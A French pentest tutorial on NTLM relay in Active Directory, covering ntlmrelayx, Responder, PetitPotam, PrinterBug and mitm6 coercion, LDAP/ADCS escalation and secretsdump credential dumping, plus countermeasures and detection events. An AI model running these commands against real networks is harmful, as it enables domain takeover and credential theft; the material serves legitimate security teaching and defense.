---
title: NTLM Relay
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [ntlm, relay, smb, ldap, active-directory, impacket, responder, pentest, sécurité]
date: 2026-03-23
---

# NTLM Relay

Le NTLM relay consiste à relayer une authentification NTLM capturée vers un autre service pour s'y authentifier sans connaître le mot de passe. C'est l'une des attaques les plus dévastatrices en environnement Active Directory, pouvant mener directement au compromis du domaine.

## Rappel du protocole NTLM

```
Flux NTLM (challenge-response) :

Client → Serveur : NEGOTIATE_MESSAGE (initiation)
Serveur → Client : CHALLENGE_MESSAGE (nonce 8 octets aléatoires)
Client → Serveur : AUTHENTICATE_MESSAGE (réponse = HMAC-MD5 du hash NT + challenge)

Versions :
  NTLMv1 : réponse = DES(hash NT, challenge) — très faible, crackable en minutes
  NTLMv2 : réponse = HMAC-MD5(hash NT, challenge + timestamp + ...) — plus robuste

Le relay exploite le fait que :
  → L'attaquant reçoit un NEGOTIATE → transmet au serveur cible → reçoit un CHALLENGE
  → Renvoie ce CHALLENGE au client → reçoit l'AUTHENTICATE → le transmet au serveur cible
  → Le serveur cible accepte l'authentification → l'attaquant est authentifié
```

## Prérequis et conditions

```
Conditions nécessaires pour le relay :

1. SMB Signing désactivé (ou non requis) sur la cible
   → Par défaut : désactivé sur les workstations, activé sur les DCs
   → Vérifier : nmap --script smb2-security-mode -p 445 RÉSEAU/24

2. LDAP Signing / Channel Binding pas enforced
   → Par défaut depuis 2020 : LDAP channel binding activé mais pas en mode "Required"
   → Souvent encore exploitable

3. EPA (Extended Protection for Authentication) désactivée sur IIS/Exchange
   → Permet le relay HTTP → LDAP, HTTP → SMB

Le relay NE fonctionne PAS :
  → SMB vers SMB si SMB Signing requis
  → NTLM vers Kerberos directement (différents protocoles)
  → Cross-protocol si EPA activé (HTTPS → LDAP si EPA)
```

## Découverte des cibles relay

```bash
# Scanner SMB Signing sur tout un réseau
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Résultat à chercher :
# | smb2-security-mode:
# |   Message signing enabled but not required  ← VULNÉRABLE (relay possible)
# |   Message signing enabled and required      ← PROTÉGÉ

# CrackMapExec — plus rapide
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# → relay_targets.txt : liste des machines sans SMB signing

# Lister les cibles LDAP sans channel binding enforced
nxc ldap 192.168.1.0/24 -u '' -p '' --query "(objectClass=*)" "*"
```

## ntlmrelayx — Outil principal

```bash
# Installation (impacket)
pip install impacket

# Relay SMB → SMB (dump SAM sur la cible)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay SMB → SMB avec exécution de commande
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\\Windows\\Temp\\out.txt"

# Relay SMB → LDAP (plus impactant — opérations AD)
impacket-ntlmrelayx -t ldap://DC01.domaine.local -smb2support

# Relay SMB → LDAPS
impacket-ntlmrelayx -t ldaps://DC01.domaine.local -smb2support --remove-mic

# Relay avec dump automatique des secrets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --dump-lm

# Interface interactive SOCKS (relay persistent)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# → Crée des connexions SOCKS réutilisables après relay
# → Dans une autre fenêtre :
# proxychains secretsdump.py -no-pass domaine/admin@192.168.1.10
```

## Déclenchement du relay — Forcer les authentifications

```bash
# Méthode 1 — Responder (poisoning LLMNR/NBT-NS) + ntlmrelayx
# ATTENTION : Responder et ntlmrelayx ne peuvent pas écouter sur le même port SMB
# → Désactiver SMB et HTTP dans Responder

# Modifier /etc/responder/Responder.conf
SMB = Off
HTTP = Off

# Lancer Responder
responder -I eth0 -rdwv

# Lancer ntlmrelayx en parallèle
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Méthode 2 — PetitPotam (forcer l'authentification d'une machine spécifique)
# Ne nécessite pas de credentials (variante non authentifiée)
python3 PetitPotam.py -u '' -p '' 192.168.1.100 DC01.domaine.local
# → DC01 s'authentifie vers 192.168.1.100 → ntlmrelayx le capture et le relaie

# PetitPotam avec credentials (variante authentifiée — plus fiable)
python3 PetitPotam.py -u alice -p Password123 192.168.1.100 DC01.domaine.local

# Méthode 3 — PrinterBug (MS-RPRN)
python3 printerbug.py domaine.local/alice:Password123@DC01 192.168.1.100

# Méthode 4 — Mitm6 (IPv6 rogue DHCPv6 + DNS)
# Empoisonne le DHCPv6, se positionne comme DNS IPv6
# Redirige les authentifications WPAD/proxy vers ntlmrelayx
python3 mitm6.py -d domaine.local

# Combiner mitm6 + ntlmrelayx → relay HTTP vers LDAP
impacket-ntlmrelayx -6 -t ldaps://DC01.domaine.local -wh attacker-wpad \
    -l /tmp/loot --delegate-access
```

## Relay LDAP — Attaques avancées

```bash
# Relay vers LDAP → ajouter un utilisateur dans Domain Admins
impacket-ntlmrelayx -t ldap://DC01.domaine.local \
    -smb2support \
    --escalate-user alice     # Donner des privilèges à alice

# Relay vers LDAP → créer un nouveau compte admin
impacket-ntlmrelayx -t ldap://DC01.domaine.local -smb2support --add-computer

# Relay vers LDAP → activer la délégation (RBCD)
# Si on relaie le compte machine d'un serveur → configurer RBCD vers un serveur cible
impacket-ntlmrelayx -t ldaps://DC01.domaine.local -smb2support \
    --delegate-access --escalate-user 'SRV01$'

# Relay vers ADCS (Active Directory Certificate Services) → ESC8
impacket-ntlmrelayx -t http://CA.domaine.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# Après relay vers ADCS : certificat du DC → PKINIT → hash NTLM → DCSync
```

## Relay via SOCKS — Utilisation persistante

```bash
# Mode SOCKS — maintenir les sessions relayées pour une utilisation ultérieure
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# Liste des sessions SOCKS disponibles
# ntlmrelayx affiche dans la console :
# [*] SMBD-Thread-1: Received connection from 192.168.1.50, attacking target smb://192.168.1.10
# [*] Authenticating against smb://192.168.1.10 as DOMAINE/ALICE SUCCEED
# [*] SOCKS: Adding DOMAINE/ALICE@192.168.1.10(445) to active SOCKS connection. Enjoy

# Configurer proxychains pour le SOCKS de ntlmrelayx (port 1080)
# /etc/proxychains4.conf
# socks4 127.0.0.1 1080

# Utiliser les sessions relayées sans mot de passe
proxychains secretsdump.py DOMAINE/ALICE@192.168.1.10 -no-pass
proxychains smbexec.py DOMAINE/ALICE@192.168.1.10 -no-pass
proxychains mssqlclient.py DOMAINE/ALICE@192.168.1.10 -windows-auth -no-pass
```

## Cross-protocol relay

```
HTTP → SMB :
  → WPAD (Web Proxy Auto-Discovery) : les machines Windows cherchent wpad.domaine.local
  → Si l'attaquant répond au nom WPAD → authentification HTTP → relay vers SMB

HTTP → LDAP :
  → Très courant avec mitm6 ou WPAD
  → Les opérations LDAP (ajouter un admin, configurer RBCD) ne nécessitent pas
    le même niveau de signature que SMB

Exchange → LDAP (PrivExchange) :
  → Exchange a des permissions étendues sur LDAP par défaut
  → Forcer Exchange à s'authentifier → relay vers LDAP → DCSync rights
  → Moins courant depuis les patches de 2019

WebDAV → SMB :
  → Forcer l'authentification HTTP via WebDAV (XACT-search)
  → Relay vers SMB sur les machines sans SMB signing
  → Contourne les restrictions sur les flux SMB directs
```

## Contre-mesures

```
SMB Signing :
  ✓ Activer SMB Signing requis (Required) sur TOUTES les machines (pas seulement les DCs)
    GPO : Computer Configuration → Windows Settings → Security Settings →
          Local Policies → Security Options →
          "Microsoft network server: Digitally sign communications (always)" = Enabled
  ✓ Coût : légère augmentation de CPU, impact réseau minimal

LDAP Signing + Channel Binding :
  ✓ Activer LDAP Signing = Required sur les DCs (depuis KB4520412)
  ✓ Activer LDAP Channel Binding = Always
    GPO : Domain Controller → LDAP server channel binding token requirements

Désactiver LLMNR et NBT-NS (tarit les authentifications spontanées) :
  ✓ GPO : désactiver LLMNR (Turn off multicast name resolution)
  ✓ Désactiver NetBIOS over TCP/IP sur les interfaces réseau
  ✓ Déployer WPAD via DNS (évite que les clients cherchent via LLMNR)

IPv6 :
  ✓ Désactiver IPv6 si non utilisé (mitm6 l'exploite)
  ✓ Ou déployer des protections DHCPv6 (DHCPv6 snooping sur les switches)

EPA (Extended Protection for Authentication) :
  ✓ Activer EPA sur IIS, Exchange, ADCS
  ✓ Lie l'authentification au canal TLS → relay HTTPS → LDAP impossible

Détection :
  Event ID 4624 : authentifications NTLM depuis des sources inattendues
  Event ID 4776 : validation de credentials NTLM (depuis machines inhabituelles)
  Surveiller les comptes modifiés dans les groupes admin (Event ID 4728, 4732)
  LDAP : surveiller les modifications de msDS-AllowedToActOnBehalfOfOtherIdentity
```

## Pièges courants

- **NTLM Relay vs Pass-the-Hash — différence cruciale** : Pass-the-Hash réutilise un hash NTLM connu pour s'authentifier. NTLM Relay **n'a pas besoin du hash** — on intercepte et on relaie l'auth en temps réel vers une cible. Pas de cracking, pas de hash extrait.
- **SMB Signing requis = relay vers SMB impossible** : Windows 10/11 client a SMB Signing requis par défaut. Les Servers, généralement non. Toujours `nxc smb 192.168.1.0/24 --gen-relay-list` pour identifier les cibles vulnérables avant de lancer Responder.
- **Désactiver SMB et HTTP dans Responder.conf** : sinon Responder gère lui-même les sessions et ne les relaie pas. Erreur classique qui fait que ntlmrelayx ne reçoit rien.
- **Relay vers le même hôte = impossible** : on ne peut pas relayer une auth de `host-A` vers `host-A` lui-même (Microsoft a patché ça avec MS08-068). Le relai ne marche qu'entre hôtes différents.
- **EPA bloque le relay HTTP → LDAPS** : Extended Protection for Authentication lie l'authentification au canal TLS. Si activée sur LDAPS ou ADCS, le relay HTTPS échoue. Vérifier dans IIS / paramètres Exchange.
- **mitm6 fait des dégâts** : redirige tout le DNS IPv6 du réseau → casse les apps qui utilisent IPv6 (Microsoft Teams, Edge, certains services internes). À ne pas laisser tourner en continu sur un grand réseau.
- **Comptes machines (ne finissant pas par $) vs Comptes user** : un relay réussi avec un compte machine donne un shell SYSTEM sur la cible. Avec un compte user admin local, idem. Avec un compte user non-admin, on n'a que les droits limités du user.
- **PetitPotam patché partiellement** : la version sans creds (anonyme) ne marche plus sur Windows récents. Mais avec un compte de base du domaine, ça marche encore. Bug de "feature", pas de "code".
- **ntlmrelayx `--target-port` pour les services non-standards** : si l'auth tombe sur un AD CS sur port 8443 au lieu de 443, sans `--target-port 8443`, ça échoue silencieusement. Bien spécifier.
- **`-c` pour exécution de commande, `-e` pour script** : confusion classique des options. `-c "powershell ..."` exécute une commande shell. `-e payload.exe` exécute un binaire local sur la cible relayée. Lire la sortie.
- **Drop the MIC (CVE-2019-1040)** : permet de bypass le MIC (Message Integrity Check) NTLM, donc relay même sur des services protégés. À tester systématiquement avec `--remove-mic`.
